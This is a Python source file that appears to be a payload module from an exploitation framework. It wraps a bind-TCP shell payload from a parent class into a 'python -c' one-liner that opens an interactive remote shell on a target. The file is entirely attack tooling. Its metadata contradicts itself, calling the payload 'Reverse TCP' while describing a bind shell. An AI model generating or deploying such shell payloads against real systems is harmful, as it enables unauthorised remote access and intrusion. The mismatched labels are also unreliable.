from firewallxpl.core.exploit import *
from firewallxpl.modules.payloads.python.bind_tcp import Payload as PythonBindTCP


class Payload(PythonBindTCP):
    __info__ = {
        "name": "Python Reverse TCP One-Liner",
        "description": "Creates interactive tcp bind shell by using python one-liner.",
        "authors": (
            "André Henrique (@mrhenrike) | União Geek",
        ),
    }

    cmd = OptString("python", "Python binary")

    def generate(self):
        self.fmt = self.cmd + ' -c "{}"'
        payload = super(Payload, self).generate()
        return payload
